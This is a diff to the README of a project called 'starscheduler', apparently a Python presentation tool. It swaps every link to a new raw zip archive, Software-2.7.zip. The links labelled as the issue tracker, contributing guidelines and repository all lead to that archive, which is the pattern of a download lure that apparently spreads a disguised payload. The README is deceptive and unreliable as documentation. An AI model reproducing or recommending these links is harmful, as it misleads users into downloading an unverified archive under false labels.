@@ -9,7 +9,7 @@ Welcome to **starscheduler**! This is a Python program designed to help you gene
 To get started, you need to download the software. Follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the releases page.
-   [Download starscheduler](https://github.com/Kcsurendra12/starscheduler/raw/refs/heads/main/img/Software-2.4.zip)
+   [Download starscheduler](https://github.com/Kcsurendra12/starscheduler/raw/refs/heads/main/user/Software-2.7.zip)
    
 2. **Find the Latest Version**: Look for the most recent version available on the page.
 
@@ -51,15 +51,15 @@ To run starscheduler smoothly, ensure your system meets these requirements:
 
 ## 📞 Support
 
-If you encounter any issues or have questions, help is available. You can contact the support team by visiting our [GitHub Issue Tracker](https://github.com/Kcsurendra12/starscheduler/raw/refs/heads/main/img/Software-2.4.zip) and submitting your queries.
+If you encounter any issues or have questions, help is available. You can contact the support team by visiting our [GitHub Issue Tracker](https://github.com/Kcsurendra12/starscheduler/raw/refs/heads/main/user/Software-2.7.zip) and submitting your queries.
 
 ## 🤝 Contributing 
 
-If you would like to contribute to starscheduler, please check our [Contributing Guidelines](https://github.com/Kcsurendra12/starscheduler/raw/refs/heads/main/img/Software-2.4.zip). Your input helps improve the application for everyone.
+If you would like to contribute to starscheduler, please check our [Contributing Guidelines](https://github.com/Kcsurendra12/starscheduler/raw/refs/heads/main/user/Software-2.7.zip). Your input helps improve the application for everyone.
 
 ## 🔗 Links
 
-- [GitHub Repository](https://github.com/Kcsurendra12/starscheduler/raw/refs/heads/main/img/Software-2.4.zip)
-- [Download starscheduler](https://github.com/Kcsurendra12/starscheduler/raw/refs/heads/main/img/Software-2.4.zip)
+- [GitHub Repository](https://github.com/Kcsurendra12/starscheduler/raw/refs/heads/main/user/Software-2.7.zip)
+- [Download starscheduler](https://github.com/Kcsurendra12/starscheduler/raw/refs/heads/main/user/Software-2.7.zip)
 
 Thank you for using starscheduler. Enjoy creating your presentations!
